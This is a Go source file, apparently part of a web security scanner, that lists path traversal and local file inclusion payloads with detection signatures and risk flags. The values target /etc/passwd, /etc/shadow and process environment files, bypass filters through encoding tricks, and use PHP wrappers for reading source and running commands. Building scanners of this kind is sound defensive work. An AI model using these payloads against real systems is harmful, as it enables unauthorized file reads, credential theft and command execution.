package payloads

// PathTraversalPayloads returns directory traversal / local file inclusion payloads
// covering Unix and Windows path separators, encoding bypasses, and null-byte termination.
// Aligned with OWASP A01:2021 / CWE-22.
func PathTraversalPayloads() PayloadSet {
	return PayloadSet{
		Category:    PayloadPathTraversal,
		Description: "Path Traversal / LFI payloads â€“ OWASP A01:2021 / CWE-22",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/3ac27901c711bdf3f5b65a7b1d1820a1/Directory%20Traversal",
		Payloads: []Payload{
			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Unix Classic â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "path-unix-etc-passwd-3", Category: PayloadPathTraversal,
				Name: "3-Level Traversal /etc/passwd", Value: `../../../etc/passwd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "3-level directory traversal to read /etc/passwd",
			},
			{
				ID: "path-unix-etc-passwd-6", Category: PayloadPathTraversal,
				Name: "6-Level Traversal /etc/passwd", Value: `../../../../../../etc/passwd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "6-level traversal for deeply nested web roots",
			},
			{
				ID: "path-unix-etc-passwd-10", Category: PayloadPathTraversal,
				Name: "10-Level Traversal /etc/passwd", Value: `../../../../../../../../../../etc/passwd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "10-level traversal for maximum depth coverage",
			},
			{
				ID: "path-unix-etc-shadow", Category: PayloadPathTraversal,
				Name: "Traversal to /etc/shadow", Value: `../../../../../../etc/shadow`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:\$[0-9a-z]+\$`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Traversal to read shadow password file (requires elevated privileges)",
			},
			{
				ID: "path-unix-proc-self-environ", Category: PayloadPathTraversal,
				Name: "Traversal to /proc/self/environ", Value: `../../../../../../proc/self/environ`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `(?i)(PATH=|HOME=|USER=|HOSTNAME=)`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Read process environment variables â€” may leak credentials",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Windows â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "path-win-hosts", Category: PayloadPathTraversal,
				Name: "Windows hosts Traversal", Value: `..\..\..\..\..\..\windows\system32\drivers\etc\hosts`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `(?i)(localhost|127\.0\.0\.1)`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Windows"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Windows backslash traversal to read hosts file",
			},
			{
				ID: "path-win-boot-ini", Category: PayloadPathTraversal,
				Name: "Windows boot.ini", Value: `..\..\..\..\boot.ini`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `(?i)(boot loader|operating systems)`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Windows"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Legacy Windows boot.ini read for traversal verification",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Encoding Bypasses â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "path-url-encoded", Category: PayloadPathTraversal,
				Name: "URL Encoded Traversal", Value: `..%2f..%2f..%2f..%2fetc%2fpasswd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "URL-encoded slash to bypass basic traversal pattern filters",
			},
			{
				ID: "path-double-url-encoded", Category: PayloadPathTraversal,
				Name: "Double URL Encoded", Value: `..%252f..%252f..%252fetc%252fpasswd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Double URL encoding for multi-pass decoding WAFs",
			},
			{
				ID: "path-backslash-encoded", Category: PayloadPathTraversal,
				Name: "Backslash URL Encoded", Value: `..%5c..%5c..%5c..%5cetc%5cpasswd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Encoded backslash for mixed separator handling",
			},
			{
				ID: "path-utf8-overlong", Category: PayloadPathTraversal,
				Name: "UTF-8 Overlong Encoding", Value: `..%c0%af..%c0%afetc%c0%afpasswd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "UTF-8 overlong encoding for '/' â€” targets older Java/Tomcat parsers",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Null Byte Truncation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "path-null-byte", Category: PayloadPathTraversal,
				Name: "Null Byte Truncation", Value: "../../../../../../etc/passwd%00.png",
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"PHP", "Perl"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Null byte to truncate file extension check (PHP < 5.3.4)",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Filter Bypass Patterns â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "path-dot-dot-semicolon", Category: PayloadPathTraversal,
				Name: "Dot-Dot-Semicolon (IIS)", Value: `..;/..;/..;/etc/passwd`,
				Contexts:  []InjectionContext{ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"IIS", "Tomcat"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Semicolon after dot-dot for IIS/Tomcat path normalization bypass",
			},
			{
				ID: "path-dot-removal-bypass", Category: PayloadPathTraversal,
				Name: "Double Dot Strip Bypass", Value: `....//....//....//etc/passwd`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "Double-dot with extra dots/slashes to survive single-pass sanitization",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ PHP Wrappers (LFI to RCE) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "path-php-filter-b64", Category: PayloadPathTraversal,
				Name: "PHP Base64 Filter", Value: `php://filter/convert.base64-encode/resource=index.php`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectReflection, DetectSignature: `[A-Za-z0-9+/]{40,}={0,2}`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"PHP"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "PHP base64 filter wrapper to read source code",
			},
			{
				ID: "path-php-expect", Category: PayloadPathTraversal,
				Name: "PHP Expect Wrapper", Value: `expect://id`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"PHP"},
				CWE: "CWE-22", OWASPCategory: "A01:2021",
				Description: "PHP expect wrapper for direct command execution via LFI",
			},
		},
	}
}
